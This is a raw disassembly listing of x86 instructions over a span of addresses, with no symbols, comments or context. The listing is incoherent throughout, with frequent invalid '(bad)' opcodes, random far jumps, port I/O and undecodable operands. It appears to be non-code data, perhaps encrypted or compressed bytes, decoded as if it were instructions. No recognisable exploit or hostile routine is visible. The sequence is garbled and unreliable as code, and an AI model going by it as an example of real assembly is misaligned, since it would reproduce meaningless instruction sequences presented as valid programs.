  41e3ac:	sbb    ch,BYTE PTR [esi+0x6]
  41e3af:	out    0x33,al
  41e3b1:	jbe    0x41e3ac
  41e3b3:	retf   0x6564
  41e3b6:	sbb    al,0x24
  41e3b8:	jns    0x41e3c9
  41e3ba:	pop    ds
  41e3bb:	pop    ecx
  41e3bc:	jne    0x41e42b
  41e3be:	and    BYTE PTR [edx+eax*4+0x65],cl
  41e3c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3c3:	mov    ebp,0x75e83bee
  41e3c8:	jb     0x41e442
  41e3ca:	mov    WORD PTR [ecx],ss
  41e3cc:	inc    esi
  41e3cd:	retf   0x31ce
  41e3d0:	mov    ebp,DWORD PTR [edx]
  41e3d2:	je     0x41e410
  41e3d4:	xchg   ebp,eax
  41e3d5:	push   ebx
  41e3d6:	iret   
  41e3d7:	dec    edx
  41e3d8:	pop    ebp
  41e3d9:	pop    esi
  41e3da:	hlt    
  41e3db:	add    BYTE PTR [esi+edx*4],ch
  41e3de:	sahf   
  41e3df:	mov    WORD PTR [ecx],es
  41e3e1:	jno    0x41e412
  41e3e3:	fcmovbe st,st(0)
  41e3e5:	xor    BYTE PTR [ebx],ah
  41e3e7:	push   ecx
  41e3e8:	in     eax,dx
  41e3e9:	xor    DWORD PTR [eax+ebx*2+0x5413ec39],esp
  41e3f0:	push   ss
  41e3f1:	arpl   WORD PTR [edx+0x450354e8],di
  41e3f7:	jg     0x41e475
  41e3f9:	jmp    0x41e41d
  41e3fb:	(bad)  
  41e3fd:	clc    
  41e3fe:	and    eax,0x5763fdb1
  41e403:	lock outs dx,DWORD PTR ds:[si]
  41e406:	(bad)  
  41e407:	loopne 0x41e3cf
  41e409:	inc    ebp
  41e40a:	push   ebp
  41e40b:	jbe    0x41e450
  41e40d:	jmp    0x88af6f9
  41e412:	and    esi,DWORD PTR [esi+esi*1]
  41e415:	mov    cl,0xb4
  41e417:	xlat   BYTE PTR ds:[ebx]
  41e418:	cmc    
  41e419:	add    al,0x96
  41e41b:	enter  0x7952,0xa8
  41e41f:	retf   0x66ca
  41e422:	mov    eax,ds:0x105bf4d8
  41e427:	cmp    ch,bh
  41e429:	pop    esi
  41e42a:	dec    ebx
  41e42b:	sub    DWORD PTR [edx+0x12f4f7f8],esi
  41e431:	push   esp
  41e432:	jbe    0x41e451
  41e434:	inc    ecx
  41e435:	ins    BYTE PTR es:[edi],dx
  41e436:	pop    edi
  41e437:	aaa    
  41e438:	popa   
  41e439:	add    esp,DWORD PTR [ecx]
  41e43b:	les    eax,FWORD PTR [edx+ecx*4]
  41e43e:	bound  edi,QWORD PTR [eax-0x27]
  41e441:	scas   eax,DWORD PTR es:[edi]
  41e442:	sub    esi,edi
  41e444:	cmp    al,0xfa
  41e446:	cmp    eax,ecx
  41e448:	sbb    cl,BYTE PTR [ebx+0x3882faa]
  41e44e:	lds    eax,FWORD PTR gs:[ebx]
  41e451:	xchg   ebx,eax
  41e452:	stos   BYTE PTR es:[edi],al
  41e453:	dec    ebp
  41e454:	sbb    BYTE PTR [edi+edx*1-0x4535ebbf],dh
  41e45b:	inc    esi
  41e45c:	xor    eax,0x3df4d706
  41e461:	sar    DWORD PTR ds:0x7467140a,cl
  41e467:	inc    ebx
  41e468:	ds inc ecx
  41e46a:	ins    DWORD PTR es:[edi],dx
  41e46b:	jae    0x41e440
  41e46d:	xor    DWORD PTR [edx+0x25ec2754],ebp
  41e473:	cwde   
  41e474:	dec    ebp
  41e475:	add    edi,DWORD PTR [edx-0x6add18dd]
  41e47b:	loope  0x41e446
  41e47d:	popa   
  41e47e:	xor    ch,BYTE PTR [esi]
  41e480:	mov    dh,0x9d
  41e482:	aas    
  41e483:	dec    ebx
  41e484:	pop    edi
  41e485:	neg    BYTE PTR [esi]
  41e487:	push   cs
  41e488:	inc    ebp
  41e489:	pop    ss
  41e48a:	add    eax,0x6ea7aff2
  41e48f:	jae    0x41e4a0
  41e491:	test   ecx,esi
  41e493:	ret    0x9987
  41e496:	dec    ecx
  41e497:	js     0x41e4d6
  41e499:	jle    0x41e459
  41e49b:	inc    eax
  41e49c:	out    dx,al
  41e49d:	outs   dx,BYTE PTR ds:[esi]
  41e49e:	cs std 
  41e4a0:	iret   
  41e4a1:	mov    ebx,0xe0e1a175
  41e4a6:	pop    es
  41e4a7:	ins    BYTE PTR es:[edi],dx
  41e4a8:	push   ss
  41e4a9:	xchg   BYTE PTR [ebx+0x5b],ah
  41e4ac:	and    DWORD PTR [ebx],edi
  41e4ae:	adc    eax,0x4caeeaac
  41e4b3:	and    BYTE PTR [esi-0x72444d1e],ch
  41e4b9:	out    0xaf,al
  41e4bb:	mov    edx,0xf0221663
  41e4c0:	mov    esp,DWORD PTR [eax+esi*4+0x52394e95]
  41e4c7:	inc    eax
  41e4c9:	pop    es
  41e4ca:	imul   edi,ecx,0x8227280e
  41e4d0:	pop    eax
  41e4d1:	inc    ecx
  41e4d2:	adc    BYTE PTR [esp+0x6c057cd2],ah
  41e4d9:	mov    bh,0x97
  41e4dc:	xchg   bl,ch
  41e4de:	inc    esp
  41e4df:	repnz stos DWORD PTR es:[edi],eax
  41e4e1:	shl    BYTE PTR [edx],0x99
  41e4e4:	dec    BYTE PTR [ebx+0x5d]
  41e4e7:	mov    ch,0xef
  41e4e9:	retf   
  41e4ea:	adc    dh,BYTE PTR [edx-0x2c4fbf15]
  41e4f0:	stos   DWORD PTR es:[edi],eax
  41e4f1:	je     0x41e56f
  41e4f3:	int3   
  41e4f4:	mov    dl,0xca
  41e4f6:	out    0xa,al
  41e4f8:	test   DWORD PTR [bx+si-0x6302],esp
  41e4fd:	rol    DWORD PTR [eax+esi*2],0x21
  41e501:	test   DWORD PTR [esi-0x4e],esp
  41e504:	shr    DWORD PTR [edx],cl
  41e506:	mov    BYTE PTR [edx],dh
  41e508:	dec    esp
  41e509:	push   0xffffffe8
  41e50b:	jmp    0x41e4f3
  41e50d:	test   esp,0xf044efdf
  41e513:	stc    
  41e514:	or     bl,BYTE PTR [esi-0x49]
  41e517:	and    DWORD PTR [edi],ebx
  41e519:	cmp    eax,0x8f98f5ba
  41e51e:	mov    cl,0x9f
  41e520:	mov    BYTE PTR [ecx+ebp*1-0x35],al
  41e524:	dec    ebx
  41e525:	cmp    dh,ah
  41e527:	popa   
  41e528:	dec    esp
  41e529:	pop    es
  41e52a:	test   eax,0x5883724b
  41e52f:	out    dx,eax
  41e530:	fwait
  41e531:	xlat   BYTE PTR ds:[ebx]
  41e532:	sub    BYTE PTR [ecx],dh
  41e534:	and    ebx,DWORD PTR [ebx-0x5d]
  41e537:	xchg   esi,eax
  41e538:	mov    dl,0x95
  41e53a:	fst    QWORD PTR [ecx+0x71]
  41e53d:	sti    
  41e53e:	lods   eax,DWORD PTR ds:[esi]
  41e53f:	pop    ds
  41e540:	or     BYTE PTR [eax-0xb],al
  41e543:	pop    ecx
  41e544:	dec    ebx
  41e545:	(bad)  
  41e546:	(bad)  
  41e547:	jmp    0x17242b18
  41e54c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e54d:	mov    al,ds:0xf0ac7378
  41e552:	pop    eax
  41e553:	push   0x34596dde
  41e558:	mov    ah,0xeb
  41e55a:	xchg   ebp,eax
  41e55b:	jne    0x41e590
  41e55d:	mov    BYTE PTR [ebp-0xe],ah
  41e560:	imul   BYTE PTR [eax]
  41e562:	and    BYTE PTR [ebp+0x3a088c6f],cl
  41e568:	xor    eax,0x6c66084
  41e56d:	(bad)  
  41e56e:	mov    edx,0xcbd54ba9
  41e573:	pop    ecx
  41e574:	push   eax
  41e575:	jno    0x41e5f6
  41e577:	jecxz  0x41e5aa
  41e579:	stos   DWORD PTR es:[edi],eax
  41e57a:	or     ch,BYTE PTR [ebp-0x60]
  41e57d:	jmp    0x86d7:0xa03612fb
  41e584:	push   ds
  41e585:	sbb    al,BYTE PTR [edi+0x57]
  41e588:	pop    edx
  41e589:	cmc    
  41e58a:	or     al,0xb2
  41e58c:	xchg   BYTE PTR [ebx],bl
  41e58e:	gs (bad) 
  41e590:	dec    esi
  41e591:	and    al,0xfe
  41e593:	in     eax,0x61
  41e595:	pop    esp
  41e596:	mov    al,0x2
  41e598:	sub    edx,DWORD PTR [ebx-0x5b00820c]
  41e59e:	stos   BYTE PTR es:[edi],al
  41e59f:	pop    edi
  41e5a0:	ss out 0x36,al
  41e5a3:	les    edx,FWORD PTR [ecx+ecx*2]
  41e5a6:	clc    
  41e5a7:	xor    eax,0xa326b890
  41e5ac:	int3   
  41e5ad:	iret   
  41e5ae:	test   eax,0x2d5ad37
  41e5b3:	int    0xd3
  41e5b5:	arpl   WORD PTR [edi-0x19285b08],bp
  41e5bb:	je     0x41e5e9
  41e5bd:	adc    al,0x4b
  41e5bf:	add    al,0xb4
  41e5c1:	in     eax,dx
  41e5c2:	mov    ds:0xc6b189c2,al
  41e5c7:	(bad)  
  41e5c8:	sbb    ebx,DWORD PTR [eax]
  41e5ca:	daa    
  41e5cb:	shr    DWORD PTR [ebx-0x57c41286],1
  41e5d1:	jno    0x41e589
  41e5d3:	mov    ch,0x69
  41e5d5:	sbb    al,cl
  41e5d7:	jne    0x41e5f5
  41e5d9:	ins    DWORD PTR es:[edi],dx
  41e5da:	jmp    0x41e580
  41e5dc:	push   es
  41e5dd:	ins    DWORD PTR es:[edi],dx
  41e5de:	mov    cl,0x3b
  41e5e0:	sbb    DWORD PTR [ebx],ebp
  41e5e2:	push   edi
  41e5e3:	lea    edx,[eax]
  41e5e5:	cmc    
  41e5e6:	es inc ebx
  41e5e8:	inc    edi
  41e5e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5ea:	aas    
  41e5eb:	add    DWORD PTR [ecx+0x2],ecx
  41e5ee:	lods   al,BYTE PTR ds:[esi]
  41e5ef:	mov    ch,0x3e
  41e5f1:	(bad)  
  41e5f2:	fnstcw WORD PTR [edx]
  41e5f4:	out    0xc4,al
  41e5f6:	or     al,0x5e
  41e5f8:	sub    BYTE PTR [ebp-0x54e471d1],0x9b
  41e5ff:	jmp    0x556f:0xea33f978
  41e606:	fucomi st,st(6)
  41e608:	cs pop ss
  41e60a:	pushf  
  41e60b:	add    al,0x13
  41e60d:	imul   eax,DWORD PTR [edi+esi*8+0x47],0x150f9d3e
  41e615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e617:	shl    esp,cl
  41e619:	addr16 jl 0x41e5d4
  41e61c:	ins    DWORD PTR es:[edi],dx
  41e61d:	call   0x26f7f78a
  41e622:	stos   DWORD PTR es:[edi],eax
  41e623:	ja     0x41e602
  41e625:	push   edx
  41e626:	mov    esi,ecx
  41e628:	add    esi,edx
  41e62a:	fisttp DWORD PTR [ebx+edx*1-0x17]
  41e62e:	add    dl,ch
  41e630:	mov    ds:0xbe1aa181,eax
  41e635:	xchg   BYTE PTR [ecx-0x20],dh
  41e638:	pusha  
  41e639:	ret    
  41e63a:	sti    
  41e63b:	fiadd  DWORD PTR [ebp-0x32e21cf7]
  41e641:	jmp    0x10c1ab8b
  41e646:	stc    
  41e647:	lds    eax,FWORD PTR [eax+0x1c]
  41e64a:	dec    edx
  41e64b:	push   edx
  41e64c:	sbb    DWORD PTR [ebx-0x2a],ebx
  41e64f:	(bad)  
  41e650:	mov    ah,0x4f
  41e652:	shl    DWORD PTR [eax+0x6f],cl
  41e655:	inc    esp
  41e656:	daa    
  41e657:	repnz sahf 
  41e659:	jle    0x41e625
  41e65b:	repz mov ?,WORD PTR [eax+0x38]
  41e65f:	icebp  
  41e660:	mov    bl,0x24
  41e662:	sahf   
  41e663:	and    al,0x5c
  41e665:	retf   
  41e666:	shrd   DWORD PTR [edx-0x30],ecx,cl
  41e66a:	fisubr DWORD PTR [ecx-0x6546cfa7]
  41e670:	outs   dx,BYTE PTR ds:[esi]
  41e671:	pop    edx
  41e672:	dec    ecx
  41e673:	repnz out dx,al
  41e675:	cwde   
  41e676:	(bad)  
  41e677:	je     0xdc220ce6
  41e67d:	pushf  
  41e67e:	jecxz  0x41e61d
  41e680:	scas   eax,DWORD PTR es:[edi]
  41e681:	(bad)  
  41e682:	(bad)  
  41e683:	xchg   ebp,eax
  41e684:	test   DWORD PTR [ecx+eax*1-0x3faada99],esi
  41e68b:	icebp  
  41e68c:	in     al,0x2d
  41e68e:	mov    bh,0x5d
  41e690:	(bad)  
  41e692:	and    ch,ah
  41e694:	xor    esi,DWORD PTR [edi+edi*1+0x9]
  41e698:	mov    eax,ds:0x2a68b50d
  41e69d:	jl     0x41e71d
  41e69f:	inc    esi
  41e6a0:	cmp    ah,dh
  41e6a2:	test   DWORD PTR es:[ebp+0x12],0xf6d1ef16
  41e6aa:	push   eax
  41e6ab:	retf   
  41e6ac:	sahf   
  41e6ad:	repnz add eax,0x48c5bfb2
  41e6b3:	fisubr WORD PTR [ecx-0x10d157d8]
  41e6b9:	mov    esp,0xe7889d10
  41e6be:	cmp    ebp,esi
  41e6c0:	dec    esi
  41e6c1:	jns    0x41e664
  41e6c3:	add    bl,0x7f
  41e6c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6c7:	mov    ah,0x94
  41e6c9:	int    0x5
  41e6cb:	mov    ebp,0x18b8e4e1
  41e6d0:	into   
  41e6d1:	jg     0x41e702
  41e6d3:	inc    esp
  41e6d4:	cmc    
  41e6d5:	in     al,0xc0
  41e6d7:	cmp    eax,0x9f8cfca1
  41e6dc:	sti    
  41e6dd:	loopne 0x41e683
  41e6df:	imul   esp,DWORD PTR [ecx-0x4b15ee1],0x5f
  41e6e6:	aaa    
  41e6e7:	or     DWORD PTR [edx-0x2b256d5e],ebp
  41e6ed:	cmp    eax,0xac1c24ca
  41e6f2:	fisub  WORD PTR [edi]
  41e6f4:	fcom   QWORD PTR [edx]
  41e6f6:	xchg   esp,eax
  41e6f7:	enter  0x7c76,0x4a
  41e6fb:	loopne 0x41e702
  41e6fd:	shl    DWORD PTR [edi-0x3e],1
  41e700:	shr    ebx,1
  41e702:	cwde   
  41e703:	sub    DWORD PTR [esi-0x7a3231e5],edi
  41e709:	push   ds
  41e70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e70b:	(bad)  
  41e70c:	rol    DWORD PTR [ecx-0x3e],cl
  41e70f:	jmp    0x41e766
  41e711:	aam    0xbb
  41e713:	outs   dx,DWORD PTR ds:[esi]
  41e714:	mov    al,0xed
  41e716:	int    0x5a
  41e718:	(bad)  
  41e719:	jp     0x41e78e
  41e71b:	sar    dl,1
  41e71d:	inc    edi
  41e71e:	pop    ss
  41e71f:	imul   ebp,DWORD PTR [edx],0xffffffc1
  41e722:	push   0x251441dc
  41e727:	retf   
  41e728:	jmp    0x1df3:0xdbbc51f9
  41e72f:	xchg   ebx,eax
  41e730:	xchg   esp,eax
  41e731:	(bad)  
  41e734:	push   edx
  41e735:	rcl    DWORD PTR [ebp+0x73b0776],0x1
  41e73c:	xchg   edi,edi
  41e73e:	jne    0x41e758
  41e740:	test   eax,0xec0e2958
  41e745:	inc    esi
  41e746:	ss ret 
  41e748:	xchg   esi,eax
  41e749:	sub    esp,DWORD PTR [esi]
  41e74b:	push   ebx
  41e74c:	icebp  
  41e74d:	test   DWORD PTR [edx+0x46503543],edx
  41e753:	retf   
  41e754:	(bad)  
  41e755:	adc    bl,cl
  41e757:	das    
  41e758:	out    0x9e,eax
  41e75a:	(bad)  
  41e75b:	je     0x41e7a6
  41e75d:	pop    ebp
  41e75e:	cwde   
  41e75f:	mov    dh,BYTE PTR [esi-0x6f]
  41e762:	mov    BYTE PTR [eax],0xb
  41e765:	fidiv  DWORD PTR [edx]
  41e767:	or     BYTE PTR [ecx+ebp*4+0x68],cl
  41e76b:	sbb    eax,0x174b62d9
  41e770:	loopne 0x41e7e2
  41e772:	lods   al,BYTE PTR ds:[esi]
  41e773:	sbb    ah,0xe8
  41e776:	sbb    DWORD PTR [edx+0x2d],ebp
  41e779:	jecxz  0x41e78a
  41e77b:	icebp  
  41e77c:	mov    es,WORD PTR [ebx+esi*4+0x4d]
  41e780:	inc    ebp
  41e781:	out    0xbb,eax
  41e783:	push   ebx
  41e784:	dec    esp
  41e785:	xor    al,0xb5
  41e787:	and    al,0x6b
  41e789:	push   0xa49de4ee
  41e78e:	inc    edx
  41e78f:	mov    eax,0x68e3a769
  41e794:	adc    eax,0x2c11de4f
  41e799:	mov    eax,0x323ee39c
  41e79e:	clc    
  41e79f:	and    DWORD PTR [esp+ebp*1],ecx
  41e7a2:	sub    DWORD PTR [edi],ebp
  41e7a4:	ret    
  41e7a5:	test   BYTE PTR [ecx-0x4c],bl
  41e7a8:	dec    ecx
  41e7a9:	adc    DWORD PTR [ebx+ebp*4-0x72848ed8],0xffffffab
  41e7b1:	fsubp  st(7),st
  41e7b3:	enter  0x7102,0xd2
  41e7b7:	jno    0x41e7c0
  41e7b9:	adc    ecx,DWORD PTR [edx-0x2d14613]
  41e7bf:	mov    ecx,0x821eff4b
  41e7c4:	mov    WORD PTR [eax],?
  41e7c6:	sbb    al,0x5e
  41e7c8:	test   cl,dl
  41e7ca:	das    
  41e7cb:	sub    BYTE PTR [ecx-0x33],bl
  41e7ce:	stos   DWORD PTR es:[edi],eax
  41e7cf:	ss inc edi
  41e7d1:	or     eax,0xb52cb631
  41e7d6:	es jnp 0x41e7b2
  41e7d9:	mov    ecx,0xfe9a7ad3
  41e7de:	dec    ebp
  41e7df:	inc    ecx
  41e7e0:	popa   
  41e7e1:	push   cs
  41e7e2:	mov    DWORD PTR [edi],ebp
  41e7e4:	sahf   
  41e7e5:	addr16 inc eax
  41e7e7:	lahf   
  41e7e8:	ja     0x41e7ea
  41e7ea:	pop    ds
  41e7eb:	je     0x41e776
  41e7ed:	jle    0x41e7ba
  41e7ef:	pusha  
  41e7f0:	out    dx,al
  41e7f1:	inc    ebx
  41e7f2:	gs pop ss
  41e7f4:	data16 adc bh,BYTE PTR [esi+0x6c5829d5]
  41e7fb:	ja     0x41e7ad
  41e7fd:	add    DWORD PTR [edi+0x7de29215],esp
  41e803:	sar    BYTE PTR [eax-0x7875c0ff],1
  41e809:	fist   WORD PTR [esi]
  41e80b:	jl     0x41e88b
  41e80d:	mov    ah,0xd9
  41e80f:	shl    BYTE PTR [eax],cl
  41e811:	mov    ds:0x66741b32,eax
  41e816:	mov    bh,0x60
  41e818:	fcmovne st,st(0)
  41e81a:	mov    cs,WORD PTR [edi-0x47]
  41e81d:	and    esi,esi
  41e81f:	jns    0x41e7eb
  41e821:	xchg   DWORD PTR [ecx+0x4d97d60d],ebp
  41e827:	dec    ebx
  41e828:	rcl    ebx,cl
  41e82a:	or     DWORD PTR [esp+eax*1+0x225c442c],eax
  41e831:	pushf  
  41e832:	push   ebp
  41e833:	lods   al,BYTE PTR ds:[esi]
  41e834:	jmp    FWORD PTR [ebx]
  41e836:	sub    BYTE PTR [esi+0x607ca423],dl
  41e83c:	and    BYTE PTR [ebx+0x32],ch
  41e83f:	push   0xffffffc4
  41e841:	cmp    dh,BYTE PTR [edi+0x5a]
  41e844:	push   ebx
  41e845:	or     ch,cl
  41e847:	push   si
  41e849:	xlat   BYTE PTR ds:[ebx]
  41e84a:	(bad)  
  41e84b:	and    eax,0x7b4ac8b9
  41e850:	loop   0x41e8c9
  41e852:	lods   al,BYTE PTR ds:[esi]
  41e853:	inc    ebp
  41e854:	add    edi,edi
  41e856:	add    al,0xe6
  41e858:	xor    eax,0xa1f0d258
  41e85d:	clc    
  41e85e:	jecxz  0x41e871
  41e860:	cwde   
  41e861:	imul   esp,DWORD PTR [ebp+0x3a],0x26ef07fb
  41e868:	jmp    0x9ba3:0x8ea52b90
  41e86f:	nop
  41e870:	fstp   QWORD PTR [edi]
  41e872:	sahf   
  41e873:	mov    eax,0x19c7561a
  41e878:	rcr    DWORD PTR [esi],0x9b
  41e87b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e87c:	cmp    BYTE PTR ds:0x82ca6d8c,bl
  41e882:	ficomp WORD PTR [eax+0x7e]
  41e885:	loope  0x41e83c
  41e887:	lds    ebx,FWORD PTR [eax+ebp*4-0x9841a16]
  41e88e:	mov    eax,0x9f4ad6bb
  41e893:	pop    ebp
  41e894:	jns    0x41e8b4
  41e896:	and    eax,0xd50cfda0
  41e89b:	scas   eax,DWORD PTR es:[edi]
  41e89c:	cmp    DWORD PTR [esi],esi
  41e89e:	push   ebx
  41e89f:	nop
  41e8a0:	jno    0x41e917
  41e8a2:	fmul   DWORD PTR [eax+eiz*8-0x76]
  41e8a6:	ret    
  41e8a7:	in     eax,0xb
  41e8a9:	shl    DWORD PTR [ebx+esi*4+0x24],1
  41e8ad:	fst    QWORD PTR [eax+0x0]
  41e8b0:	pop    ds
  41e8b1:	mov    cl,0xa3
  41e8b3:	gs dec esi
  41e8b5:	xlat   BYTE PTR ds:[bx]
  41e8b7:	add    BYTE PTR [ecx+0x1941b42f],bh
  41e8bd:	and    al,0xb6
  41e8bf:	xchg   edi,eax
  41e8c0:	pop    ebp
  41e8c1:	or     BYTE PTR [eax+0x7f],cl
  41e8c4:	sti    
  41e8c5:	ss mov ebp,0x39e4b7cc
  41e8cb:	cs push ebp
  41e8cd:	ds ins DWORD PTR es:[edi],dx
  41e8cf:	sbb    eax,0x6e9cb2fb
  41e8d4:	mov    eax,ds:0x7bb578cf
  41e8d9:	ins    BYTE PTR es:[edi],dx
  41e8da:	cmp    al,dh
  41e8dc:	push   eax
  41e8dd:	fwait
  41e8de:	test   al,0xb
  41e8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8e1:	or     esi,eax
  41e8e3:	nop
  41e8e4:	add    al,0x78
  41e8e6:	repnz shl ebx,1
  41e8e9:	(bad)  
  41e8ea:	dec    ebx
  41e8eb:	pop    ss
  41e8ec:	lods   eax,DWORD PTR ds:[esi]
  41e8ed:	dec    ecx
  41e8ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8ef:	pop    edx
  41e8f0:	pop    esp
  41e8f1:	xor    DWORD PTR fs:[eax],0x7a5fd91f
  41e8f8:	clc    
  41e8f9:	add    al,0xa3
  41e8fb:	arpl   WORD PTR [edx],ax
  41e8fd:	(bad)  
  41e8fe:	jle    0x41e946
  41e900:	jg     0x41e898
  41e902:	lea    ebp,[ecx+0x8]
  41e905:	cld    
  41e906:	cs aad 0x86
  41e909:	mov    bl,0x76
  41e90b:	mov    bl,0xc8
  41e90d:	jbe    0x41e96f
  41e90f:	inc    eax
  41e910:	test   eax,0x6b27fa60
  41e915:	pop    ss
  41e916:	out    0xba,eax
  41e918:	cld    
  41e919:	push   eax
  41e91a:	push   esi
  41e91b:	mov    ds:0x8d21d7bd,al
  41e920:	xlat   BYTE PTR ds:[ebx]
  41e921:	into   
  41e922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e923:	retf   0x8c4d
  41e926:	cmp    bh,dh
  41e928:	sbb    eax,0x80fc3b8b
  41e92d:	xor    eax,0x88c4cf84
  41e932:	adc    al,0x75
  41e934:	loope  0x41e918
  41e936:	lods   eax,DWORD PTR ds:[esi]
  41e937:	mov    dl,0x19
  41e939:	loop   0x41e97a
  41e93b:	dec    esp
  41e93c:	test   al,0x33
  41e93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e940:	pop    ebp
  41e941:	cmp    DWORD PTR [eax+0xa],0x33ce60d3
  41e948:	xor    edx,DWORD PTR [eax-0x3d]
  41e94b:	fsubp  st(3),st
  41e94d:	in     al,dx
  41e94e:	nop
  41e94f:	ins    BYTE PTR es:[edi],dx
  41e950:	lock jns 0x41e9c4
  41e953:	xor    al,0xe5
  41e956:	leave  
  41e957:	stos   DWORD PTR es:[edi],eax
  41e958:	mov    cl,0x9
  41e95a:	jecxz  0x41e994
  41e95c:	ret    0x6506
  41e95f:	arpl   WORD PTR [ecx],cx
  41e961:	rcl    DWORD PTR ds:0x6f2fe964,cl
  41e967:	or     BYTE PTR [eax],0x8a
  41e96a:	mov    ch,0xf8
  41e96c:	xlat   BYTE PTR ds:[ebx]
  41e96d:	xchg   esi,eax
  41e96e:	sbb    al,0x4f
  41e970:	int3   
  41e971:	fwait
  41e972:	jmp    0xaa02a998
  41e977:	pop    ecx
  41e978:	pop    edi
  41e979:	push   esp
  41e97a:	cld    
  41e97b:	xchg   esp,eax
  41e97c:	pushf  
  41e97d:	ror    BYTE PTR [ebx+0x22],0xeb
  41e981:	out    0x75,al
  41e983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e984:	jg     0x41e9c6
  41e986:	push   ebx
  41e987:	push   0xc2fac805
  41e98c:	les    esp,FWORD PTR [esi]
  41e98e:	mov    esp,0xc8dde0f1
  41e993:	jge    0x41ea0b
  41e995:	push   es
  41e996:	retf   0x8b09
  41e999:	rcr    BYTE PTR ds:0x21bf902b,1
  41e99f:	mov    WORD PTR [ebp+0x7195c2ec],?
  41e9a5:	jb     0x41e944
  41e9a7:	and    eax,0x93492f01
  41e9ac:	cld    
  41e9ad:	(bad)  
  41e9af:	(bad)  
  41e9b1:	mov    ds:0xdb4b34dc,eax
  41e9b6:	mov    dl,0x51
  41e9b8:	jno    0x41e9ad
  41e9ba:	sbb    ebx,eax
  41e9bc:	sub    ch,0xf8
  41e9bf:	push   esi
  41e9c0:	inc    esp
  41e9c1:	sub    bh,ch
  41e9c3:	jge    0x41e9c5
  41e9c5:	sub    BYTE PTR [edi-0x42d98e0e],ah
  41e9cb:	add    al,0xba
  41e9cd:	retf   
  41e9ce:	mov    edx,0x1dbf56d3
  41e9d3:	xchg   esi,eax
  41e9d4:	pop    ss
  41e9d5:	addr16 sti 
  41e9d7:	pop    ecx
  41e9d8:	xchg   esp,eax
  41e9d9:	mov    dl,0xbc
  41e9db:	pusha  
  41e9dc:	popf   
  41e9dd:	xor    edx,eax
  41e9df:	stos   BYTE PTR es:[edi],al
  41e9e0:	push   ebx
  41e9e1:	rol    ebp,0xd2
  41e9e4:	push   esp
  41e9e5:	add    dh,cl
  41e9e7:	adc    BYTE PTR [eax],bh
  41e9e9:	scas   eax,DWORD PTR es:[edi]
  41e9ea:	fmul   QWORD PTR [esi-0x2effc879]
  41e9f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9f1:	aam    0x20
  41e9f3:	(bad)  
  41e9f4:	js     0x41e9e7
  41e9f6:	fidivr DWORD PTR [edi+0x17d79573]
  41e9fc:	(bad)  
  41e9fd:	in     al,dx
  41e9fe:	ins    DWORD PTR es:[edi],dx
  41e9ff:	push   edx
  41ea00:	push   ebx
  41ea01:	imul   esi,DWORD PTR [edi-0x5f51a047],0x1537186a
  41ea0b:	stos   DWORD PTR es:[edi],eax
  41ea0c:	(bad)  [ecx-0x53e61212]
  41ea12:	out    dx,eax
  41ea13:	sti    
  41ea14:	cld    
  41ea15:	xchg   DWORD PTR [edx],ecx
  41ea17:	mov    ebp,edx
  41ea19:	jg     0x41ea8d
  41ea1b:	jmp    DWORD PTR [ecx]
  41ea1d:	inc    ecx
  41ea1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea1f:	int3   
  41ea20:	lods   eax,DWORD PTR ds:[esi]
  41ea21:	sub    esp,DWORD PTR [ebx+0x6cb5b7da]
  41ea27:	pusha  
  41ea28:	call   0xa73ec730
  41ea2d:	jle    0x41ea6b
  41ea2f:	inc    ecx
  41ea30:	ja     0x41ea91
  41ea32:	pop    esp
  41ea33:	js     0x41ea70
  41ea35:	ins    DWORD PTR es:[edi],dx
  41ea36:	call   0x207a5c52
  41ea3b:	loope  0x41ea57
  41ea3d:	push   ecx
  41ea3e:	in     eax,0xd0
  41ea40:	ins    DWORD PTR es:[edi],dx
  41ea41:	mov    dh,0xdc
  41ea43:	out    dx,eax
  41ea44:	sbb    bl,BYTE PTR [esi-0x264206ae]
  41ea4a:	cmp    ebx,DWORD PTR [edx+0x7f]
  41ea4d:	icebp  
  41ea4e:	sub    eax,0xc04fd0e3
  41ea53:	ficomp DWORD PTR [ebx]
  41ea55:	sahf   
  41ea56:	xor    al,cl
  41ea58:	repnz imul ecx,DWORD PTR [edi+0x6d],0xffffffd3
  41ea5d:	stos   DWORD PTR es:[edi],eax
  41ea5e:	ja     0x41ea6c
  41ea60:	xchg   ebx,eax
  41ea61:	test   eax,0xaf4610d7
  41ea66:	push   esi
  41ea67:	hlt    
  41ea68:	fld    TBYTE PTR [edi]
  41ea6a:	aaa    
  41ea6b:	mov    ecx,0xd4beea8c
  41ea70:	xchg   ecx,eax
  41ea71:	inc    esi
  41ea72:	mov    ebx,?
  41ea74:	lods   al,BYTE PTR ds:[esi]
  41ea75:	ja     0x41ea28
  41ea77:	scas   eax,DWORD PTR es:[edi]
  41ea78:	repz pop ecx
  41ea7a:	dec    eax
  41ea7b:	inc    esp
  41ea7c:	test   DWORD PTR [eax+edx*2-0x15],ebp
  41ea80:	jae    0x41ea8c
  41ea82:	pusha  
  41ea83:	sbb    BYTE PTR [ebx],bh
  41ea85:	in     al,dx
  41ea86:	fld    DWORD PTR [ebp+0x9]
  41ea89:	or     al,0xfe
  41ea8b:	int3   
  41ea8c:	rcr    DWORD PTR [edi-0x21],cl
  41ea8f:	(bad)  
  41ea90:	in     eax,0x76
  41ea92:	aaa    
  41ea93:	shl    BYTE PTR [ebp+edi*1-0x5201397c],1
  41ea9a:	xor    al,0x67
  41ea9c:	pop    eax
  41ea9d:	adc    eax,DWORD PTR [ebx+0x4]
  41eaa0:	push   ss
  41eaa1:	dec    edx
  41eaa2:	outs   dx,DWORD PTR ds:[esi]
  41eaa3:	sub    al,0x94
